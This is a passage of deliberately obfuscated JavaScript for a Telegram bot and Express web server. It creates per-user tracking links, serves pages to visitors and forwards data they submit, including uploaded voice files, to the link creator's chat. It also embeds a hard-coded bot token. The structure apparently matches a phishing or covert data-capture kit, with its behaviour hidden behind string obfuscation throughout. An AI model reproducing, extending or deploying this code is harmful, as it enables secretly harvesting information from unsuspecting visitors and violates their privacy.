    _0x527283[_0x39ff27(0xbb7)](_0x27f3e8, developerId) ? _0x527283[_0x39ff27(0x4c4)](sendAdminPanel, _0x27f3e8) : bot[_0x39ff27(0xb04) + 'e'](_0x27f3e8, _0x527283[_0x39ff27(0x5a5)]);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x276af7 => {
    const _0x1f3b2c = _0x298049, _0x30f975 = {
            'SpZeL': function (_0x4ae7d6, _0x1c1b19) {
                return _0x4ae7d6 === _0x1c1b19;
            },
            'jAesM': _0x1f3b2c(0x455),
            'WKCUX': _0x1f3b2c(0x34e) + _0x1f3b2c(0x22d) + _0x1f3b2c(0x794) + _0x1f3b2c(0xc3f),
            'VTzzr': _0x1f3b2c(0xadc),
            'gfllU': _0x1f3b2c(0x34e) + _0x1f3b2c(0x22d) + _0x1f3b2c(0x880) + _0x1f3b2c(0x930),
            'sDCiL': _0x1f3b2c(0xa52),
            'jvrYl': _0x1f3b2c(0x435) + _0x1f3b2c(0x440) + _0x1f3b2c(0xc3a) + _0x1f3b2c(0x72f) + _0x1f3b2c(0x9b8),
            'sUQyh': _0x1f3b2c(0xd0a) + 'l',
            'eQrut': _0x1f3b2c(0x42e) + _0x1f3b2c(0xc8a) + _0x1f3b2c(0x4b1) + _0x1f3b2c(0x386) + _0x1f3b2c(0x454) + _0x1f3b2c(0x572),
            'bzBTx': _0x1f3b2c(0x41b) + _0x1f3b2c(0x787),
            'kaSip': _0x1f3b2c(0x34e) + _0x1f3b2c(0x58b) + _0x1f3b2c(0x668) + _0x1f3b2c(0xaa0) + _0x1f3b2c(0x335) + _0x1f3b2c(0x4a4) + 'ي:',
            'zQWZl': _0x1f3b2c(0x497),
            'NueGf': _0x1f3b2c(0x250) + _0x1f3b2c(0xa85) + _0x1f3b2c(0x5bc),
            'cOkAz': _0x1f3b2c(0x30a),
            'qqknQ': _0x1f3b2c(0xcef) + _0x1f3b2c(0x32b),
            'nAyCJ': _0x1f3b2c(0x763)
        }, _0x3bb5e9 = _0x276af7[_0x1f3b2c(0x33c)][_0x1f3b2c(0x556)]['id'], _0x8fb57d = _0x276af7[_0x1f3b2c(0xc57)];
    if (_0x30f975[_0x1f3b2c(0x987)](_0x3bb5e9, developerId))
        switch (_0x8fb57d) {
        case _0x30f975[_0x1f3b2c(0xc75)]:
            bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0xc47)]), sessionState[_0x1f3b2c(0x420)] = !![];
            break;
        case _0x30f975[_0x1f3b2c(0x727)]:
            bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0x5fa)]), sessionState[_0x1f3b2c(0x856)] = !![];
            break;
        case _0x30f975[_0x1f3b2c(0xcd0)]:
            bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0x25d)]), sessionState[_0x1f3b2c(0xa52)] = !![];
            break;
        case _0x30f975[_0x1f3b2c(0x806)]:
            bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0x4ed)]), sessionState[_0x1f3b2c(0x979)] = !![];
            break;
        case _0x30f975[_0x1f3b2c(0x711)]:
            bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0x8ae)]), sessionState[_0x1f3b2c(0xbb8) + _0x1f3b2c(0x717)] = !![];
            break;
        case _0x30f975[_0x1f3b2c(0x348)]:
            isPaidBot = !![], bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0xc88)]);
            break;
        case _0x30f975[_0x1f3b2c(0x1d7)]:
            isPaidBot = ![], bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x30f975[_0x1f3b2c(0x93f)]);
            break;
        }
    else {
        if (_0x8fb57d[_0x1f3b2c(0x5cd)](_0x30f975[_0x1f3b2c(0x817)])) {
            const _0x2bcdeb = _0x8fb57d[_0x1f3b2c(0xb11)]('_')[0x1 * -0x1835 + -0x18eb * -0x1 + -0xb4];
            if (linkData[_0x2bcdeb] && _0x30f975[_0x1f3b2c(0x987)](linkData[_0x2bcdeb][_0x1f3b2c(0x498)], _0x276af7[_0x1f3b2c(0x9cc)]['id'])) {
                const _0x671e6d = _0x1f3b2c(0x9bd) + _0x1f3b2c(0xa5c) + _0x1f3b2c(0x819) + _0x1f3b2c(0x704) + _0x1f3b2c(0x19e) + _0x1f3b2c(0x85d) + _0x1f3b2c(0xb2d) + _0x1f3b2c(0x760) + _0x1f3b2c(0x47b) + botUsername + _0x1f3b2c(0x8e6) + _0x2bcdeb + (_0x1f3b2c(0xb1b) + _0x1f3b2c(0xa05) + _0x1f3b2c(0x3b0) + _0x1f3b2c(0xa07));
                bot[_0x1f3b2c(0xb04) + 'e'](_0x3bb5e9, _0x671e6d);
            }
        }
    }
}), bot['on'](_0x298049(0x9e8) + _0x298049(0x782), _0x9d1e4e => {
    const _0x264507 = _0x298049;
    console[_0x264507(0x9d7)](_0x9d1e4e);
});
const SECOND_BOT_TOKEN = _0x298049(0x923) + _0x298049(0x2bd) + _0x298049(0x531) + _0x298049(0x33e) + _0x298049(0x5c9), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
async function isUserSubscribed(_0x32b05d) {
    const _0x2e21c6 = _0x298049, _0x253b9e = {
            'JSCvo': function (_0x231dcd, _0x16c3e5) {
                return _0x231dcd === _0x16c3e5;
            },
            'CMxAI': _0x2e21c6(0x9ec),
            'bAqsK': function (_0x1ac530, _0x53e210) {
                return _0x1ac530 === _0x53e210;
            },
            'LcbPJ': _0x2e21c6(0x1eb) + _0x2e21c6(0x192),
            'YHASZ': function (_0x7c8b0a, _0x5e9c55) {
                return _0x7c8b0a === _0x5e9c55;
            },
            'MECrO': _0x2e21c6(0xca9),
            'PPiad': _0x2e21c6(0xb0c) + _0x2e21c6(0x9d1) + _0x2e21c6(0x564) + ':'
        }, _0x37245a = fixedChannels[_0x2e21c6(0x953)](additionalChannels);
    try {
        const _0x295063 = await Promise[_0x2e21c6(0xae7)](_0x37245a[_0x2e21c6(0x5c0)](_0x50f116 => bot[_0x2e21c6(0xb42) + _0x2e21c6(0xae9)](_0x50f116['id'], _0x32b05d)));
        return _0x295063[_0x2e21c6(0x2f3)](_0x1bc073 => {
            const _0x210865 = _0x2e21c6, _0x5bf42d = _0x1bc073[_0x210865(0x1b1)];
            return _0x253b9e[_0x210865(0x193)](_0x5bf42d, _0x253b9e[_0x210865(0x283)]) || _0x253b9e[_0x210865(0xc2b)](_0x5bf42d, _0x253b9e[_0x210865(0x499)]) || _0x253b9e[_0x210865(0xbb4)](_0x5bf42d, _0x253b9e[_0x210865(0x5b9)]);
        });
    } catch (_0x4d69f3) {
        return console[_0x2e21c6(0x7b5)](_0x253b9e[_0x2e21c6(0x972)], _0x4d69f3), ![];
    }
}
bot[_0x298049(0x65c)](/\/Vip/, async _0x7eae9c => {
    const _0x205973 = _0x298049, _0x217ee1 = {
            'AeeXx': function (_0x565a92, _0x566005) {
                return _0x565a92(_0x566005);
            },
            'hZvXJ': _0x205973(0x2e9) + _0x205973(0xba9) + _0x205973(0xc36) + _0x205973(0x2c1) + _0x205973(0xb85) + _0x205973(0xae2),
            'FXqJD': _0x205973(0x886) + _0x205973(0xbfb) + _0x205973(0x3e3) + _0x205973(0x3d6) + _0x205973(0x7d1) + _0x205973(0xbc5) + _0x205973(0x4ea) + _0x205973(0xc12),
            'SOKWI': _0x205973(0xa28) + _0x205973(0x675) + _0x205973(0xa7a),
            'UAyex': _0x205973(0x45d) + _0x205973(0xaec) + _0x205973(0x624) + _0x205973(0x82e),
            'LviRo': _0x205973(0x84e) + _0x205973(0x81a) + _0x205973(0x49d) + _0x205973(0x5c6),
            'IUwhh': _0x205973(0xa24) + _0x205973(0x7ab) + _0x205973(0x18e),
            'NFmVB': _0x205973(0x359) + _0x205973(0x8ec),
            'kUYKW': _0x205973(0x359) + _0x205973(0x5af)
        }, _0x3439f5 = _0x7eae9c[_0x205973(0x556)]['id'], _0x4749a1 = _0x7eae9c[_0x205973(0x9cc)]['id'], _0x44165c = await _0x217ee1[_0x205973(0xbd4)](isUserSubscribed, _0x3439f5);
    if (!_0x44165c) {
        const _0x4d7318 = _0x217ee1[_0x205973(0x872)], _0x5b42c3 = fixedChannels[_0x205973(0x953)](additionalChannels), _0x576928 = _0x5b42c3[_0x205973(0x5c0)](_0x420f50 => [{
                    'text': _0x205973(0x657) + _0x420f50[_0x205973(0xd02)],
                    'url': _0x420f50[_0x205973(0x648)]
                }]);
        bot[_0x205973(0xb04) + 'e'](_0x3439f5, _0x4d7318, { 'reply_markup': { 'inline_keyboard': _0x576928 } });
        return;
    }
    const _0x184349 = uuid['v4']();
    linkData[_0x184349] = {
        'userId': _0x4749a1,
        'chatId': _0x3439f5,
        'visitors': []
    };
    const _0x2a0aee = _0x217ee1[_0x205973(0x775)];
    bot[_0x205973(0xb04) + 'e'](_0x3439f5, _0x2a0aee, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x217ee1[_0x205973(0x7cc)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }],
                [{
                        'text': _0x217ee1[_0x205973(0x352)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }],
                [{
                        'text': _0x217ee1[_0x205973(0x3f9)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }],
                [{
                        'text': _0x217ee1[_0x205973(0x686)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }],
                [{
                        'text': _0x217ee1[_0x205973(0x403)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }],
                [{
                        'text': _0x217ee1[_0x205973(0x286)],
                        'callback_data': _0x205973(0x763) + _0x184349
                    }]
            ]
        }
    });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x4abfbf => {
    const _0x57ad5a = _0x298049, _0x4be7f6 = {
            'hNeRU': _0x57ad5a(0x763),
            'pmJvP': function (_0x23a98d, _0xdad506) {
                return _0x23a98d === _0xdad506;
            }
        }, _0x2371a1 = _0x4abfbf[_0x57ad5a(0x33c)][_0x57ad5a(0x556)]['id'], _0x23a49c = _0x4abfbf[_0x57ad5a(0x9cc)]['id'];
    if (_0x4abfbf[_0x57ad5a(0xc57)][_0x57ad5a(0x5cd)](_0x4be7f6[_0x57ad5a(0xca0)])) {
        const _0x2b6922 = _0x4abfbf[_0x57ad5a(0xc57)][_0x57ad5a(0xb11)]('_')[-0x1 * 0x183f + -0x6a3 * 0x1 + 0xf72 * 0x2];
        if (linkData[_0x2b6922] && _0x4be7f6[_0x57ad5a(0x492)](linkData[_0x2b6922][_0x57ad5a(0x498)], _0x23a49c)) {
            const _0x1c9d92 = _0x57ad5a(0x9bd) + _0x57ad5a(0xa5c) + _0x57ad5a(0x819) + _0x57ad5a(0x704) + _0x57ad5a(0x19e) + _0x57ad5a(0x85d) + _0x57ad5a(0xb2d) + _0x57ad5a(0x760) + _0x57ad5a(0x47b) + botUsername + _0x57ad5a(0x8e6) + _0x2b6922 + (_0x57ad5a(0xb1b) + _0x57ad5a(0xa05) + _0x57ad5a(0x3b0) + _0x57ad5a(0xa07));
            bot[_0x57ad5a(0xb04) + 'e'](_0x2371a1, _0x1c9d92);
        }
    }
}), bot[_0x298049(0x65c)](/\/vip (.+)/, async (_0xa9a8b8, _0x9e0bba) => {
    const _0x24f6b2 = _0x298049, _0xaa774e = {
            'xIKkN': function (_0x1abf59, _0x239707) {
                return _0x1abf59(_0x239707);
            },
            'ISbBs': _0x24f6b2(0x2e9) + _0x24f6b2(0xba9) + _0x24f6b2(0xc36) + _0x24f6b2(0x2c1) + _0x24f6b2(0xb85) + _0x24f6b2(0xae2),
            'lcRnw': function (_0x11f1c8, _0x349916) {
                return _0x11f1c8 !== _0x349916;
            },
            'bgdup': function (_0x3238be, _0x2649cc) {
                return _0x3238be !== _0x2649cc;
            },
            'wxWwm': function (_0x247541, _0x3327e8) {
                return _0x247541 !== _0x3327e8;
            }
        }, _0x54543e = _0x9e0bba[-0x12f * -0x18 + -0x6 * 0x3e5 + -0x509], _0x1b6668 = _0xa9a8b8[_0x24f6b2(0x9cc)]['id'], _0xda8c25 = _0xa9a8b8[_0x24f6b2(0x556)]['id'], _0x25ad03 = await _0xaa774e[_0x24f6b2(0xb8f)](isUserSubscribed, _0xda8c25);
    if (!_0x25ad03) {
        const _0x147e82 = _0xaa774e[_0x24f6b2(0x311)], _0x2fc515 = fixedChannels[_0x24f6b2(0x953)](additionalChannels), _0x42fa32 = _0x2fc515[_0x24f6b2(0x5c0)](_0x5b4d2b => [{
                    'text': _0x24f6b2(0x657) + _0x5b4d2b[_0x24f6b2(0xd02)],
                    'url': _0x5b4d2b[_0x24f6b2(0x648)]
                }]);
        _0x147e82 && _0xaa774e[_0x24f6b2(0x27f)](_0x147e82[_0x24f6b2(0x5b6)](), '') && bot[_0x24f6b2(0xb04) + 'e'](_0xda8c25, _0x147e82, { 'reply_markup': { 'inline_keyboard': _0x42fa32 } });
        return;
    }
    if (linkData[_0x54543e]) {
        const {
            userId: _0x3e3138,
            visitors: _0x4e7c1d
        } = linkData[_0x54543e];
        if (_0xaa774e[_0x24f6b2(0x5a3)](_0x1b6668, _0x3e3138) && (!visitorData[_0x1b6668] || !visitorData[_0x1b6668][_0x24f6b2(0x948)](_0x3e3138))) {
            _0x4e7c1d[_0x24f6b2(0x39e)](_0x1b6668);
            !visitorData[_0x1b6668] && (visitorData[_0x1b6668] = []);
            visitorData[_0x1b6668][_0x24f6b2(0x39e)](_0x3e3138);
            !userPoints[_0x3e3138] && (userPoints[_0x3e3138] = -0x17 * 0x42 + -0x108a * 0x2 + -0x1381 * -0x2);
            userPoints[_0x3e3138] += -0x139 * 0x15 + -0xd31 * -0x2 + -0xb4;
            const _0x27a260 = _0x24f6b2(0x9e9) + _0x24f6b2(0x963) + _0x24f6b2(0xb23) + _0x24f6b2(0x60a) + _0x24f6b2(0xb2d) + _0x24f6b2(0xaa8) + _0x24f6b2(0xc38) + _0x24f6b2(0x87c) + _0x24f6b2(0xc56) + _0x24f6b2(0x6f1) + _0x24f6b2(0x4c8) + _0x24f6b2(0x95a) + _0x24f6b2(0xb47) + _0x24f6b2(0x985);
            _0x27a260 && _0xaa774e[_0x24f6b2(0x5a3)](_0x27a260[_0x24f6b2(0x5b6)](), '') && bot[_0x24f6b2(0xb04) + 'e'](_0xda8c25, _0x27a260);
            const _0x10940f = _0x24f6b2(0x5e1) + _0x24f6b2(0x9cb) + _0x24f6b2(0x4aa) + _0x24f6b2(0x798) + _0x24f6b2(0x4d1);
            _0x10940f && _0xaa774e[_0x24f6b2(0x7e4)](_0x10940f[_0x24f6b2(0x5b6)](), '') && bot[_0x24f6b2(0xb04) + 'e'](_0x3e3138, _0x10940f);
        }
    }
}), bot[_0x298049(0x65c)](/\/free/, async _0x514900 => {
    const _0x521d27 = _0x298049, _0x55be3b = {
            'swoeO': function (_0x472021, _0x2d016e) {
                return _0x472021 - _0x2d016e;
            },
            'qqZrQ': function (_0x40f390, _0x532048) {
                return _0x40f390 !== _0x532048;
            },
            'ZowoD': _0x521d27(0xa16) + _0x521d27(0x5a2) + _0x521d27(0x67a) + _0x521d27(0x25f) + _0x521d27(0x295) + _0x521d27(0x6bd) + _0x521d27(0xb58),
            'Aquza': function (_0x2387b2, _0xf4e9f2) {
                return _0x2387b2 !== _0xf4e9f2;
            }
        }, _0x21e1db = _0x514900[_0x521d27(0x556)]['id'], _0x483a2b = _0x514900[_0x521d27(0x9cc)]['id'];
    if (userPoints[_0x483a2b]) {
        const _0x27e6ae = userPoints[_0x483a2b], _0xa616bc = _0x521d27(0x79a) + 'ا\x20' + _0x27e6ae + (_0x521d27(0x294) + _0x521d27(0x9a7)) + _0x55be3b[_0x521d27(0x814)](0x2131 + 0x26eb + -0x47fe, _0x27e6ae) + (_0x521d27(0xd28) + _0x521d27(0x518) + _0x521d27(0x873) + _0x521d27(0x68e) + 'ة.');
        _0xa616bc && _0x55be3b[_0x521d27(0xcd3)](_0xa616bc[_0x521d27(0x5b6)](), '') && bot[_0x521d27(0xb04) + 'e'](_0x21e1db, _0xa616bc);
    } else {
        const _0x486f9a = _0x55be3b[_0x521d27(0x64c)];
        _0x486f9a && _0x55be3b[_0x521d27(0x845)](_0x486f9a[_0x521d27(0x5b6)](), '') && bot[_0x521d27(0xb04) + 'e'](_0x21e1db, _0x486f9a);
    }
}), bot[_0x298049(0x65c)](/\/start (.+)/, async (_0xe3e75d, _0x3da96c) => {
    const _0x378778 = _0x298049, _0x41027e = {
            'mzkhO': function (_0x1857ca, _0x19cbbf) {
                return _0x1857ca(_0x19cbbf);
            },
            'ojIAq': _0x378778(0x2e9) + _0x378778(0xba9) + _0x378778(0xc36) + _0x378778(0x2c1) + _0x378778(0xb85) + _0x378778(0xae2),
            'kLCYv': function (_0x430461, _0x350bc1) {
                return _0x430461 !== _0x350bc1;
            }
        }, _0x4f5657 = _0x3da96c[0x251 * -0x5 + 0x18 * 0x83 + -0xb2], _0x228dab = _0xe3e75d[_0x378778(0x9cc)]['id'], _0x1d4cbf = _0xe3e75d[_0x378778(0x556)]['id'], _0x4610d7 = await _0x41027e[_0x378778(0x913)](isUserSubscribed, _0x1d4cbf);
    if (!_0x4610d7) {
        const _0x454feb = _0x41027e[_0x378778(0x9a3)], _0x46889c = fixedChannels[_0x378778(0x953)](additionalChannels), _0xd3cbf4 = _0x46889c[_0x378778(0x5c0)](_0x497604 => [{
                    'text': _0x378778(0x657) + _0x497604[_0x378778(0xd02)],
                    'url': _0x497604[_0x378778(0x648)]
                }]);
        bot[_0x378778(0xb04) + 'e'](_0x1d4cbf, _0x454feb, { 'reply_markup': { 'inline_keyboard': _0xd3cbf4 } });
        return;
    }
    if (linkData[_0x4f5657]) {
        const {
            userId: _0x596bf0,
            visitors: _0x46be76
        } = linkData[_0x4f5657];
        if (_0x41027e[_0x378778(0x321)](_0x228dab, _0x596bf0) && (!visitorData[_0x228dab] || !visitorData[_0x228dab][_0x378778(0x948)](_0x596bf0))) {
            _0x46be76[_0x378778(0x39e)](_0x228dab);
            !visitorData[_0x228dab] && (visitorData[_0x228dab] = []);
            visitorData[_0x228dab][_0x378778(0x39e)](_0x596bf0);
            !userPoints[_0x596bf0] && (userPoints[_0x596bf0] = 0x133a + 0xded + -0x45 * 0x7b);
            userPoints[_0x596bf0] += 0x13 * -0x1ad + 0x1d7 * 0x13 + -0x31d;
            const _0x160d6d = _0x378778(0x9e9) + _0x378778(0x963) + _0x378778(0xb23) + _0x378778(0x60a) + _0x378778(0xb2d) + _0x378778(0xaa8) + _0x378778(0xc38) + _0x378778(0x87c) + _0x378778(0xc56) + _0x378778(0x6b1) + _0x378778(0x9ce);
            bot[_0x378778(0xb04) + 'e'](_0x1d4cbf, _0x160d6d);
        }
    }
});
const app = express();
app[_0x298049(0x1fc)](bodyParser[_0x298049(0x990)]({
    'extended': !![],
    'limit': _0x298049(0xc93)
})), app[_0x298049(0x1fc)](bodyParser[_0x298049(0xc45)]({ 'limit': _0x298049(0x35f) })), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname));
const storage = multer[_0x298049(0x461) + _0x298049(0x8a3)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x298049(0x485) });
app[_0x298049(0x943)](_0x298049(0x632) + 'rm', (_0x202d9f, _0x5bb328) => {
    const _0x4daed8 = _0x298049, _0x342845 = {
            'BgWIb': _0x4daed8(0x9d3) + _0x4daed8(0x5ae) + _0x4daed8(0x5f9),
            'nwEHH': _0x4daed8(0x954),
            'uoVDv': _0x4daed8(0xb2b),
            'SUteB': _0x4daed8(0xc2a),
            'vJOGF': _0x4daed8(0x597),
            'STWqf': _0x4daed8(0x2d4),
            'IKwRA': _0x4daed8(0x836)
        }, _0x2e59b8 = _0x202d9f[_0x4daed8(0x3a0)][_0x4daed8(0x586)], _0x32c808 = _0x202d9f[_0x4daed8(0x3a0)][_0x4daed8(0xc04)];
    if (!_0x2e59b8)
        return _0x5bb328[_0x4daed8(0x1b1)](-0x218b + 0x3 * 0x191 + 0x1e68)[_0x4daed8(0x2d8)](_0x342845[_0x4daed8(0x432)]);
    let _0x59fbf7 = '';
    switch (_0x32c808) {
    case _0x342845[_0x4daed8(0x5ec)]:
        _0x59fbf7 = _0x342845[_0x4daed8(0x5b0)];
        break;
    case _0x342845[_0x4daed8(0xa13)]:
        _0x59fbf7 = _0x342845[_0x4daed8(0x5f3)];
        break;
    case _0x342845[_0x4daed8(0x73a)]:
    default:
        _0x59fbf7 = _0x342845[_0x4daed8(0x7b6)];
        break;
    }
    _0x5bb328[_0x4daed8(0x504)](path[_0x4daed8(0xc65)](__dirname, _0x59fbf7));
}), app[_0x298049(0x943)](_0x298049(0x6cb) + _0x298049(0x719), (_0x1f4ab4, _0x3a262c) => {
    const _0x71cf63 = _0x298049, _0x26332b = {
            'SpIDe': function (_0x178628, _0x5ac69e) {
                return _0x178628(_0x5ac69e);
            },
            'ZyBFb': _0x71cf63(0x2d3),
            'ndsnS': _0x71cf63(0x7c2) + _0x71cf63(0x8cd) + _0x71cf63(0x8c2) + _0x71cf63(0x64f) + _0x71cf63(0x3d1) + _0x71cf63(0x209),
            'mribG': _0x71cf63(0xa2b) + _0x71cf63(0x35e) + _0x71cf63(0x724) + _0x71cf63(0x4ff) + _0x71cf63(0x936) + _0x71cf63(0x19f)
        }, _0x34d1fb = _0x1f4ab4[_0x71cf63(0x7cf)][_0x71cf63(0x59e)];
    _0x26332b[_0x71cf63(0x332)](validateLinkUsage, _0x34d1fb) ? _0x3a262c[_0x71cf63(0x504)](path[_0x71cf63(0xc65)](__dirname, _0x26332b[_0x71cf63(0xa4e)])) : (_0x3a262c[_0x71cf63(0x2d8)](_0x26332b[_0x71cf63(0xd1b)]), bot[_0x71cf63(0xb04) + 'e'](linkUsage[_0x34d1fb][_0x71cf63(0x586)], _0x26332b[_0x71cf63(0x3f1)]));
}), app[_0x298049(0x943)](_0x298049(0x6ef) + _0x298049(0xb49) + 'd', (_0x410db7, _0x5367fa) => {
    const _0x50d509 = _0x298049, _0x575874 = {
            'QWbtu': function (_0x2da1b, _0xb71745) {
                return _0x2da1b(_0xb71745);
            },
            'mqQeo': _0x50d509(0x2eb),
            'slodl': _0x50d509(0x7c2) + _0x50d509(0x8cd) + _0x50d509(0x8c2) + _0x50d509(0x64f) + _0x50d509(0x3d1) + _0x50d509(0x209),
            'EExUb': _0x50d509(0xa2b) + _0x50d509(0x35e) + _0x50d509(0x724) + _0x50d509(0x4ff) + _0x50d509(0x936) + _0x50d509(0x19f)
        }, _0x161355 = _0x410db7[_0x50d509(0x7cf)][_0x50d509(0x59e)];
    _0x575874[_0x50d509(0x5c3)](validateLinkUsage, _0x161355) ? _0x5367fa[_0x50d509(0x504)](path[_0x50d509(0xc65)](__dirname, _0x575874[_0x50d509(0x38e)])) : (_0x5367fa[_0x50d509(0x2d8)](_0x575874[_0x50d509(0x291)]), bot[_0x50d509(0xb04) + 'e'](linkUsage[_0x161355][_0x50d509(0x586)], _0x575874[_0x50d509(0x231)]));
}), app[_0x298049(0x943)](_0x298049(0x8e4) + _0x298049(0xa79), (_0x373227, _0x2f5021) => {
    const _0x1c7015 = _0x298049, _0xcacd69 = {
            'DEDwT': function (_0x32da1f, _0x8ef043) {
                return _0x32da1f(_0x8ef043);
            },
            'jEfMZ': _0x1c7015(0x9c6),
            'NzIrN': _0x1c7015(0x7c2) + _0x1c7015(0x8cd) + _0x1c7015(0x8c2) + _0x1c7015(0x64f) + _0x1c7015(0x3d1) + _0x1c7015(0x209),
            'vnOQE': _0x1c7015(0xa2b) + _0x1c7015(0x35e) + _0x1c7015(0x724) + _0x1c7015(0x4ff) + _0x1c7015(0x936) + _0x1c7015(0x19f)
        }, _0x5c3e58 = _0x373227[_0x1c7015(0x7cf)][_0x1c7015(0x59e)];
    _0xcacd69[_0x1c7015(0x18b)](validateLinkUsage, _0x5c3e58) ? _0x2f5021[_0x1c7015(0x504)](path[_0x1c7015(0xc65)](__dirname, _0xcacd69[_0x1c7015(0x97a)])) : (_0x2f5021[_0x1c7015(0x2d8)](_0xcacd69[_0x1c7015(0x974)]), bot[_0x1c7015(0xb04) + 'e'](linkUsage[_0x5c3e58][_0x1c7015(0x586)], _0xcacd69[_0x1c7015(0x951)]));
}), app[_0x298049(0x943)](_0x298049(0x79e) + _0x298049(0xb0a), (_0x53cda6, _0x5cea76) => {
    const _0x156c09 = _0x298049, _0xb0e110 = {
            'ybtZP': function (_0x2a71e1, _0x4ceded) {
                return _0x2a71e1(_0x4ceded);
            },
            'qDdju': _0x156c09(0x6e5),
            'jgTbT': _0x156c09(0x7c2) + _0x156c09(0x8cd) + _0x156c09(0x8c2) + _0x156c09(0x64f) + _0x156c09(0x3d1) + _0x156c09(0x209),
            'mwAKN': _0x156c09(0xa2b) + _0x156c09(0x35e) + _0x156c09(0x724) + _0x156c09(0x4ff) + _0x156c09(0x936) + _0x156c09(0x19f)
        }, _0x13230e = _0x53cda6[_0x156c09(0x7cf)][_0x156c09(0x59e)];
    _0xb0e110[_0x156c09(0x8d1)](validateLinkUsage, _0x13230e) ? _0x5cea76[_0x156c09(0x504)](path[_0x156c09(0xc65)](__dirname, _0xb0e110[_0x156c09(0xc1b)])) : (_0x5cea76[_0x156c09(0x2d8)](_0xb0e110[_0x156c09(0xaf5)]), bot[_0x156c09(0xb04) + 'e'](linkUsage[_0x13230e][_0x156c09(0x586)], _0xb0e110[_0x156c09(0xb57)]));
}), app[_0x298049(0xb22)](_0x298049(0xb97) + 'es', (_0x143709, _0xc31768) => {
    const _0x60a3ed = _0x298049, _0x594de5 = {
            'IxKdy': _0x60a3ed(0xcf9) + _0x60a3ed(0x2b7) + _0x60a3ed(0x252) + ':',
            'rHgER': _0x60a3ed(0xcc5) + _0x60a3ed(0x5a0),
            'luETa': _0x60a3ed(0x7fb) + _0x60a3ed(0x68b) + _0x60a3ed(0x77c) + _0x60a3ed(0xa9a) + _0x60a3ed(0x58d) + _0x60a3ed(0x742)
        }, _0x523e3e = _0x143709[_0x60a3ed(0x2ea)][_0x60a3ed(0x586)], _0xcc840f = _0x143709[_0x60a3ed(0x2ea)][_0x60a3ed(0x4c0)], _0x5e1edb = _0x143709[_0x60a3ed(0x2ea)][_0x60a3ed(0x88e)];
    console[_0x60a3ed(0x9d7)](_0x594de5[_0x60a3ed(0x888)], _0x143709[_0x60a3ed(0x2ea)]), bot[_0x60a3ed(0xb04) + 'e'](_0x523e3e, _0x60a3ed(0x4fc) + _0x60a3ed(0xce0) + _0x60a3ed(0x9c4) + ':\x20' + _0xcc840f + (_0x60a3ed(0x7c1) + _0x60a3ed(0xc31)) + _0x5e1edb)[_0x60a3ed(0x86c)](() => {
    })[_0x60a3ed(0x40a)](_0x4c7f9e => {
        const _0x5154b5 = _0x60a3ed;
        console[_0x5154b5(0x7b5)](_0x594de5[_0x5154b5(0xcf1)], _0x4c7f9e[_0x5154b5(0xcfb)] ? _0x4c7f9e[_0x5154b5(0xcfb)][_0x5154b5(0x2ea)] : _0x4c7f9e);
    }), _0xc31768[_0x60a3ed(0xbce)](_0x594de5[_0x60a3ed(0x7e7)]);
}), app[_0x298049(0x1fc)](bodyParser[_0x298049(0xc45)]()), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname)), app[_0x298049(0x943)](_0x298049(0xaca), (_0x259198, _0x50a55c) => {
    const _0x49430d = _0x298049, _0x3c53b5 = { 'PLcun': _0x49430d(0x428) };
    _0x50a55c[_0x49430d(0x504)](path[_0x49430d(0xc65)](__dirname, _0x3c53b5[_0x49430d(0x7f2)]));
}), app[_0x298049(0xb22)](_0x298049(0x337) + _0x298049(0x99b), (_0x2b7854, _0x5361da) => {
    const _0x4d3b6a = _0x298049, _0x1c6776 = { 'cSAfg': _0x4d3b6a(0xcf9) + _0x4d3b6a(0x2b7) + _0x4d3b6a(0x252) + ':' }, _0x12b4cd = _0x2b7854[_0x4d3b6a(0x2ea)][_0x4d3b6a(0x586)], _0x5cb6d7 = _0x2b7854[_0x4d3b6a(0x2ea)][_0x4d3b6a(0x8b9) + 'r'];
    bot[_0x4d3b6a(0xb04) + 'e'](_0x12b4cd, _0x4d3b6a(0x70e) + _0x4d3b6a(0x6c4) + _0x4d3b6a(0xa49) + _0x4d3b6a(0x31a) + _0x4d3b6a(0x786) + _0x4d3b6a(0x63a) + _0x4d3b6a(0x816) + _0x4d3b6a(0x90d) + ':\x20' + _0x5cb6d7)[_0x4d3b6a(0x86c)](() => {
    })[_0x4d3b6a(0x40a)](_0x445d29 => {
        const _0x5f60ef = _0x4d3b6a;
        console[_0x5f60ef(0x7b5)](_0x1c6776[_0x5f60ef(0x9f1)], _0x445d29[_0x5f60ef(0xcfb)] ? _0x445d29[_0x5f60ef(0xcfb)][_0x5f60ef(0x2ea)] : _0x445d29);
    });
}), app[_0x298049(0xb22)](_0x298049(0xd2a) + 'e', (_0x378ef3, _0x558920) => {
    const _0x2def22 = _0x298049, _0x32d09a = {
            'WdNEu': _0x2def22(0xad2) + _0x2def22(0x4e4) + _0x2def22(0x277),
            'VvtIA': _0x2def22(0xcf9) + _0x2def22(0x2b7) + _0x2def22(0x252) + ':'
        }, _0x3ed1f0 = _0x378ef3[_0x2def22(0x2ea)][_0x2def22(0x586)], _0x2fa797 = _0x378ef3[_0x2def22(0x2ea)][_0x2def22(0x3c3)];
